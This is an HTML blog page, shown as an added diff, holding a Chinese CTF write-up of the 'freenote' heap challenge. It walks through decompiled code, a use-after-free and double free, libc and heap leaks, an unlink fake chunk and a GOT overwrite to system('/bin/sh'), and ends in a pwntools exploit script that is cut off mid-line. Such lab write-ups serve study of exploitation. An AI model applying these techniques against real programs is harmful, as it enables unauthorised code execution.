@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="description" content="0x01 程序分析这是一个记录note的程序： 123456789.&#x2F;freenote&#x3D;&#x3D; 0ops Free Note &#x3D;&#x3D;1. List Note2. New Note3. Edit Note4. Delete Note5. Exit&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unlink-FreeNote">
+<meta property="og:url" content="http://yoursite.com/2018/09/21/unlink-FreeNote/index.html">
+<meta property="og:site_name" content="Kirin&#39;s Blog">
+<meta property="og:description" content="0x01 程序分析这是一个记录note的程序： 123456789.&#x2F;freenote&#x3D;&#x3D; 0ops Free Note &#x3D;&#x3D;1. List Note2. New Note3. Edit Note4. Delete Note5. Exit&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&amp;#">
+<meta property="article:published_time" content="2018-09-21T08:29:48.000Z">
+<meta property="article:modified_time" content="2018-09-22T08:30:18.000Z">
+<meta property="article:author" content="Kirin">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>unlink-FreeNote</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/10/19/InCTF2018-load3r-wARMup-securepad/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/09/13/unlink-Simple-note/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/09/21/unlink-FreeNote/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/09/21/unlink-FreeNote/&text=unlink-FreeNote" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/09/21/unlink-FreeNote/&title=unlink-FreeNote" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/09/21/unlink-FreeNote/&is_video=false&description=unlink-FreeNote" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=unlink-FreeNote&body=Check out this article: http://yoursite.com/2018/09/21/unlink-FreeNote/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/09/21/unlink-FreeNote/&title=unlink-FreeNote" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/09/21/unlink-FreeNote/&title=unlink-FreeNote" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/09/21/unlink-FreeNote/&title=unlink-FreeNote" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/09/21/unlink-FreeNote/&title=unlink-FreeNote" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/09/21/unlink-FreeNote/&name=unlink-FreeNote&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-程序分析"><span class="toc-number">1.</span> <span class="toc-text">0x01 程序分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#new"><span class="toc-number">1.0.1.</span> <span class="toc-text">new</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete"><span class="toc-number">1.1.</span> <span class="toc-text">delete</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit"><span class="toc-number">1.2.</span> <span class="toc-text">edit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞"><span class="toc-number">2.</span> <span class="toc-text">0x02 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#leak-libc"><span class="toc-number">2.1.</span> <span class="toc-text">leak libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#leak-heap"><span class="toc-number">2.2.</span> <span class="toc-text">leak heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Double-free-amp-amp-unlink"><span class="toc-number">2.3.</span> <span class="toc-text">Double free &amp;&amp; unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#system-“-bin-sh”"><span class="toc-number">2.4.</span> <span class="toc-text">system(“&#x2F;bin&#x2F;sh”)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-EXP"><span class="toc-number">3.</span> <span class="toc-text">0x03 EXP</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        unlink-FreeNote
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kirin's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-09-21T08:29:48.000Z" itemprop="datePublished">2018-09-21</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x01-程序分析"><a href="#0x01-程序分析" class="headerlink" title="0x01 程序分析"></a>0x01 程序分析</h2><p>这是一个记录note的程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;freenote</span><br><span class="line">&#x3D;&#x3D; 0ops Free Note &#x3D;&#x3D;</span><br><span class="line">1. List Note</span><br><span class="line">2. New Note</span><br><span class="line">3. Edit Note</span><br><span class="line">4. Delete Note</span><br><span class="line">5. Exit</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Your choice:</span><br></pre></td></tr></table></figure>
+<p>在bss段全局变量note_addr记录堆中记录note的结构体的开始地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v0 &#x3D; malloc(0x1810uLL);</span><br><span class="line">note_addr &#x3D; (__int64)v0;</span><br></pre></td></tr></table></figure>
+<h4 id="new"><a href="#new" class="headerlink" title="new"></a>new</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">int new()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; &#x2F;&#x2F; rax</span><br><span class="line">  void *v1; &#x2F;&#x2F; ST18_8</span><br><span class="line">  int i; &#x2F;&#x2F; [rsp+Ch] [rbp-14h]</span><br><span class="line">  int v4; &#x2F;&#x2F; [rsp+10h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  if ( *(_QWORD *)(note_addr + 8) &lt; *(_QWORD *)note_addr )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i &#x3D; 0; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 &#x3D; *(_QWORD *)note_addr;</span><br><span class="line">      if ( (signed __int64)i &gt;&#x3D; *(_QWORD *)note_addr )</span><br><span class="line">        break;</span><br><span class="line">      if ( !*(_QWORD *)(note_addr + 24LL * i + 16) )</span><br><span class="line">      &#123;</span><br><span class="line">        printf(&quot;Length of new note: &quot;);</span><br><span class="line">        v4 &#x3D; number();</span><br><span class="line">        if ( v4 &gt; 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( v4 &gt; 4096 )</span><br><span class="line">            v4 &#x3D; 0x1000;</span><br><span class="line">          v1 &#x3D; malloc((128 - v4 % 128) % 128 + v4);</span><br><span class="line">          printf(&quot;Enter your note: &quot;);</span><br><span class="line">          sub_40085D((__int64)v1, v4);</span><br><span class="line">          *(_QWORD *)(note_addr + 24LL * i + 16) &#x3D; 1LL;</span><br><span class="line">          *(_QWORD *)(note_addr + 24LL * i + 24) &#x3D; v4;</span><br><span class="line">          *(_QWORD *)(note_addr + 24LL * i + 32) &#x3D; v1;</span><br><span class="line">          ++*(_QWORD *)(note_addr + 8);</span><br><span class="line">          LODWORD(v0) &#x3D; puts(&quot;Done.&quot;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>可以得到程序的数据结构：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">note_addr-&gt;heap</span><br><span class="line">*note_addr&#x3D;0x100-&gt;max_note_number</span><br><span class="line">*(note_addr+8)&#x3D;note_number</span><br><span class="line">note_struct&#123;</span><br><span class="line">	flag;&#x2F;&#x2F;标记是否使用</span><br><span class="line">	length;&#x2F;&#x2F;max_length&#x3D;0x1000</span><br><span class="line">	addr;&#x2F;&#x2F;malloc_note_addr</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>同时注意到malloc：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1 &#x3D; malloc((128 - v4 % 128) % 128 + v4);</span><br></pre></td></tr></table></figure>
+<p>类似malloc的对齐操作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define request2size(req)                                                      \</span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="line">         ? MINSIZE                                                             \</span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure>
+<p>只不过进行了128对齐：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">len&lt;128 ? malloc(128):malloc(len%128&#x3D;&#x3D;0? [len&#x2F;128]*128,([len&#x2F;128]+1)*128)</span><br></pre></td></tr></table></figure>
+<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( *(_QWORD *)(note_addr + 8) &lt;&#x3D; 0LL )</span><br><span class="line">    return puts(&quot;No notes yet.&quot;);</span><br><span class="line">  printf(&quot;Note number: &quot;);</span><br><span class="line">  v1 &#x3D; number();</span><br><span class="line">  if ( v1 &lt; 0 || (signed __int64)v1 &gt;&#x3D; *(_QWORD *)note_addr )</span><br><span class="line">    return puts(&quot;Invalid number!&quot;);</span><br><span class="line">  --*(_QWORD *)(note_addr + 8);</span><br><span class="line">  *(_QWORD *)(note_addr + 24LL * v1 + 16) &#x3D; 0LL;</span><br><span class="line">  *(_QWORD *)(note_addr + 24LL * v1 + 24) &#x3D; 0LL;</span><br><span class="line">  free(*(void **)(note_addr + 24LL * v1 + 32));</span><br><span class="line">  return puts(&quot;Done.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将flag和length清零，而后free掉addr，没有置空指针，存在UAF<br>而且delete只检验了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1 &lt; 0 || (signed __int64)v1 &gt;&#x3D; *(_QWORD *)note_addr</span><br></pre></td></tr></table></figure>
+<p>存在double free</p>
+<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">int edit()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; &#x2F;&#x2F; rbx</span><br><span class="line">  int v2; &#x2F;&#x2F; [rsp+4h] [rbp-1Ch]</span><br><span class="line">  int v3; &#x2F;&#x2F; [rsp+8h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Note number: &quot;);</span><br><span class="line">  v3 &#x3D; number();</span><br><span class="line">  if ( v3 &lt; 0 || (signed __int64)v3 &gt;&#x3D; *(_QWORD *)note_addr || *(_QWORD *)(note_addr + 24LL * v3 + 16) !&#x3D; 1LL )</span><br><span class="line">    return puts(&quot;Invalid number!&quot;);</span><br><span class="line">  printf(&quot;Length of note: &quot;);</span><br><span class="line">  v2 &#x3D; number();</span><br><span class="line">  if ( v2 &lt;&#x3D; 0 )</span><br><span class="line">    return puts(&quot;Invalid length!&quot;);</span><br><span class="line">  if ( v2 &gt; 4096 )</span><br><span class="line">    v2 &#x3D; 4096;</span><br><span class="line">  if ( v2 !&#x3D; *(_QWORD *)(note_addr + 24LL * v3 + 24) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 &#x3D; note_addr;</span><br><span class="line">    *(_QWORD *)(v1 + 24LL * v3 + 32) &#x3D; realloc(*(void **)(note_addr + 24LL * v3 + 32), (128 - v2 % 128) % 128 + v2);</span><br><span class="line">    *(_QWORD *)(note_addr + 24LL * v3 + 24) &#x3D; v2;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Enter your note: &quot;);</span><br><span class="line">  sub_40085D(*(_QWORD *)(note_addr + 24LL * v3 + 32), v2);</span><br><span class="line">  return puts(&quot;Done.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意到修改时的realloc操作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)(v1 + 24LL * v3 + 32) &#x3D; realloc(*(void **)(note_addr + 24LL * v3 + 32), (128 - v2 % 128) % 128 + v2);</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-漏洞"><a href="#0x02-漏洞" class="headerlink" title="0x02 漏洞"></a>0x02 漏洞</h2><h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">new(8,&quot;a&quot;*7)</span><br><span class="line">new(8,&quot;a&quot;*7)</span><br><span class="line">delete(0)</span><br><span class="line">new(8,&quot;a&quot;*7)</span><br><span class="line">p.recvuntil(&quot;choice: &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;aaaaaaa\n&quot;)</span><br><span class="line">libc.address&#x3D;u64(p.recv(6).ljust(8,&quot;\x00&quot;))-0x3c4b78</span><br></pre></td></tr></table></figure>
+<h3 id="leak-heap"><a href="#leak-heap" class="headerlink" title="leak heap"></a>leak heap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">new(8,&quot;a&quot;*7)</span><br><span class="line">new(8,&quot;a&quot;*7)</span><br><span class="line">new(8,&quot;a&quot;*7)</span><br><span class="line">new(8,&quot;a&quot;*7)</span><br><span class="line">delete(0)</span><br><span class="line">delete(2)</span><br><span class="line">new(8,&quot;a&quot;*7)</span><br><span class="line">new(8,&quot;a&quot;*7)</span><br><span class="line">p.recvuntil(&quot;choice: &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;0. aaaaaaa\n&quot;)</span><br><span class="line">heap_addr&#x3D;u64(p.recv(4).ljust(8,&quot;\x00&quot;))</span><br><span class="line">p.recvuntil(&quot;2. aaaaaaa\n&quot;)</span><br><span class="line">libc.address&#x3D;u64(p.recv(6).ljust(8,&quot;\x00&quot;))-0x3c4b78</span><br></pre></td></tr></table></figure>
+<h3 id="Double-free-amp-amp-unlink"><a href="#Double-free-amp-amp-unlink" class="headerlink" title="Double free &amp;&amp; unlink"></a>Double free &amp;&amp; unlink</h3><p>开始构造的chunk:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">delete(3)</span><br><span class="line">delete(2)</span><br><span class="line">fake_chunk&#x3D;p64(0)+p64(0x81)+p64(heap_addr+0x60-0x18)+p64(heap_addr+0x60-0x10)+&#39;a&#39;*0x60+p64(0x80)+p64(0x90)</span><br><span class="line">new(len(fake_chunk),fake_chunk)</span><br><span class="line">delete(3)</span><br></pre></td></tr></table></figure>
+<p>报错：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">double free or corruption (out)</span><br></pre></td></tr></table></figure>
+<p><strong>而后在fake chunk后添加了两个chunk后unlink成功(猜测是与top chunk合并或者进入fastbin的问题，而且构造0x50时会直接进入了fastbin，0x80就会先处于unsorted bin，这些问题有待解决)</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(3)</span><br><span class="line">delete(2)</span><br><span class="line">fake_chunk&#x3D;p64(0)+p64(0x81)+p64(heap_addr+0x60-0x18)+p64(heap_addr+0x60-0x10)+&#39;a&#39;*0x60+p64(0x80)+p64(0x90)+&#39;a&#39;*0x80+p64(0)+p64(0x91)+&#39;a&#39;*0x80+p64(0)+p64(0x91)+&#39;a&#39;*0x80</span><br><span class="line">delete(3)</span><br></pre></td></tr></table></figure>
+<p>查看保存note结构体的chunk:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x20b9000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0x0, </span><br><span class="line">  size &#x3D; 0x1821, </span><br><span class="line">  fd &#x3D; 0x100, </span><br><span class="line">  bk &#x3D; 0x2, </span><br><span class="line">  fd_nextsize &#x3D; 0x1, </span><br><span class="line">  bk_nextsize &#x3D; 0x8</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;100gx 0x20b9000</span><br><span class="line">0x20b9000:	0x0000000000000000	0x0000000000001821</span><br><span class="line">0x20b9010:	0x0000000000000100	0x0000000000000002</span><br><span class="line">0x20b9020:	0x0000000000000001	0x0000000000000008</span><br><span class="line">0x20b9030:	0x00000000020ba830	0x0000000000000001</span><br><span class="line">0x20b9040:	0x0000000000000008	0x00000000020ba8c0</span><br><span class="line">0x20b9050:	0x0000000000000001	0x0000000000000230</span><br><span class="line">0x20b9060:	0x00000000020b9048	0x0000000000000000</span><br><span class="line">0x20b9070:	0x0000000000000000	0x00000000020ba9e0</span><br><span class="line">0x20b9080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20b9090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p><strong>可以看到unlink成功，note[2]的addr已被改为指向比自己低0x18的地方，即note[1]的addr</strong><br>而后我们edit(2)即可修改note[1]结构体addr处及其后面的所有值<br>(<strong>注意edit时要输入的length和note[2].length一致，防止其进行realloc</strong>)<br>我们将note[1].addr修改为free的got地址，再edit(1),将free的got地址处修改为system_addr,最后delete一个储存内容为”/bin/sh”的note结构体即会执行system(“/bin/sh”)</p>
+<h3 id="system-“-bin-sh”"><a href="#system-“-bin-sh”" class="headerlink" title="system(“/bin/sh”)"></a>system(“/bin/sh”)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(2,0x230,p64(elf.got[&#39;free&#39;])+p64(0)*0x228)</span><br><span class="line">edit(1,0x8,p64(libc.symbols[&#39;system&#39;]))</span><br><span class="line">delete(0)</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-EXP"><a href="#0x03-EXP" class="headerlink" title="0x03 EXP"></a>0x03 EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">p&#x3D;process(&quot;.&#x2F;freenote&quot;)</span><br><span class="line">elf&#x3D;ELF(&quot;.&#x2F;freenote&quot;)</span><br><span class="line">libc&#x3D;ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def new(length,note):</span><br><span class="line">	p.recvuntil(&quot;choice: &quot;)</span><br><span class="line">	p.sendline(&quot;2&quot;)</span><br><span class="line">	p.recvuntil(&quot;note: &quot;)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	p.recvuntil(&quot;note: &quot;)</span><br><span class="line">	p.sendline(note)</span><br><span class="line"></span><br><span class="line">def edit(num,length,note):</span><br><span class="line">	p.recvuntil(&quot;choice: &quot;)</span><br><span class="line">	p.sendline(&quot;3&quot;)</span><br><span class="line">	p.recvuntil(&quot;number: &quot;)</span><br><span class="line">	p.sendline(str(num))</span><br><span class="line">	p.recvuntil(&quot;note: &quot;)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	p.recvuntil(&quot;note: &quot;)</span><br><span class="line">	p.sendline(note)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete(num):</span><br><span class="line">	p.recvuntil(&quot;choice: &quot;)</span><br><span class="line">	p.sendline(&quot;4&quot;)</span><br><span class="line">	p.recvuntil(&quot;number: &quot;)</span><br><span class="line">	p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(8,&quot;a&quot;*7)</span><br><span class="line">new(8,&quot;a&quot;*7)</span><br><span class="line">new(8,&quot;a&quot;*7)</span><br><span class="line">new(8,&quot;a&quot;*7)</span><br><span class="line">delete(0)</span><br><span class="line">delete(2)</span><br><span class="line">new(8,&quot;&#x2F;bin&#x2F;sh&quot;)</span><br><span class="line">new(8,&quot;a&quot;*7)</span><br><span 